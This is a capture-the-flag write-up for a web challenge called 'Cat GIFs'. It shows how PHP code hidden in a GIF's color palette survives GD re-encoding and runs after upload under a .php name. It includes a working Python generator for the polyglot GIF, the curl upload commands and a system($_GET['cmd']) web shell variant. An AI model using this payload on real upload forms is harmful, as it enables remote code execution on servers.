---
layout: post
title:  "Cat GIFs"
date:   2026-06-08 14:51:00 -0400
author: robo.uzi
tags: [CTF]
permalink: /Dal-CTF-2026-cat-gifs/
---

**Title**: Cat GIFs

**Author**: kidkraken

**Category**: Web

**Description**: I made a website to store my cat gifs :3 Instance available at: `https://dalctf-cat-gifs-154-64616c.instancer.dalctf2026.com/`

I go to the site and test uploading a normal gif just to see what the upload looks like:

![Alt text](/images/dalctfweb7.png)

I can visit my upload at `https://dalctf-cat-gifs-154-64616c.instancer.dalctf2026.com/uploads/cat.gif`.

I started testing different file upload vulnerabilities until I get this response from one:
```html
<div class="alert alert-error">
  <div>
    imagegif(): Argument #1 ($image) must be of type GdImage, bool given           </div>
</div>
```

It gave me this error after I prepended `GIF89a` (gif magic bytes) to some php code like this:
```php
GIF89a <?php system('cat /flag.txt'); ?>
```

So the server uses PHPs GD library to re encode every uploaded GIF. GD strips most metadata but it preserves the global color table. By embedding PHP code into the palette bytes of a valid GIF, the code will survive re encoding. I can save the file with a `.php` extension, so the PHP interpreter executes any `<?php ... ?>` tags found anywhere in the file. 

I just need to embed the php correctly. I ran this python:
```shell
python3  
Python 3.13.5 (main, May  5 2026, 21:05:52) [GCC 14.2.0] on linux  
Type "help", "copyright", "credits" or "license" for more information.  
>>> from PIL import Image  
...   
... payload = b'<?php system("cat /flag.txt"); ?>'  
...  
... # 16 colors > 48 bytes (enough for the payload)  
... palette = payload + b'\x00' * (48 - len(payload))  
...  
... # creating a 16 by 1 image that uses every color index once  
... img = Image.new('P', (16, 1))  
... img.putpalette(palette)  
... for i in range(16):  
...     img.putpixel((i, 0), i)  
...  
... img.save('payload.gif')  
... print("payload.gif created")  
...  
payload.gif created  
>>> exit
```

Now I have a gif that looks like this:
```shell
xxd payload.gif | head  
00000000: 4749 4638 3761 1000 0100 8300 003c 3f70  GIF87a.......<?p  
00000010: 6870 2073 7973 7465 6d28 2263 6174 202f  hp system("cat /  
00000020: 666c 6167 2e74 7874 2229 3b20 3f3e 0000  flag.txt"); ?>..  
00000030: 0000 0000 0000 0000 0000 0000 002c 0000  .............,..  
00000040: 0000 1000 0100 0008 1500 0104 1030 8040  .............0.@  
00000050: 0103 0710 2450 b080 4103 070f 0202 003b  ....$P..A......;
```

I uploaded the file with curl:
```shell
curl -X POST https://dalctf-cat-gifs-154-64616c.instancer.dalctf2026.com/ -H "Cookie: PHPSESSID=a344902497712024f77d62de5f4d89fd" -F "gif_file=@payload.gif;filename=shell.php"
```

Download the file:
```shell
curl https://dalctf-cat-gifs-154-64616c.instancer.dalctf2026.com/uploads/shell.php -o meow-flag.txt  
% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
Dload  Upload   Total   Spent    Left  Speed  
100    80    0    80    0     0    266      0 --:--:-- --:--:-- --:--:--   265  

cat meow-flag.txt  
GIF87a�dalctf{m30w_m3333333000w}  
,  
1H1%�XsO;
```

You can also change the payload to this (`payload = b'<?php echo system($_GET["cmd"]); ?>'` ):
```shell
xxd payload.gif  
00000000: 4749 4638 3761 1000 0100 8300 003c 3f70  GIF87a.......<?p  
00000010: 6870 2065 6368 6f20 7379 7374 656d 2824  hp echo system($  
00000020: 5f47 4554 5b22 636d 6422 5d29 3b20 3f3e  _GET["cmd"]); ?>  
00000030: 0000 0000 0000 0000 0000 0000 002c 0000  .............,..  
00000040: 0000 1000 0100 0008 1500 0104 1030 8040  .............0.@  
00000050: 0103 0710 2450 b080 4103 070f 0202 003b  ....$P..A......;
```
It is much easier execute commands on the server this way. 

After uploading it (`https://dalctf-cat-gifs-154-64616c.instancer.dalctf2026.com/uploads/shell2.php?cmd=id`):
```shell
GIF87a�uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data),1H1%�XsO;
```

`dalctf{m30w_m3333333000w}`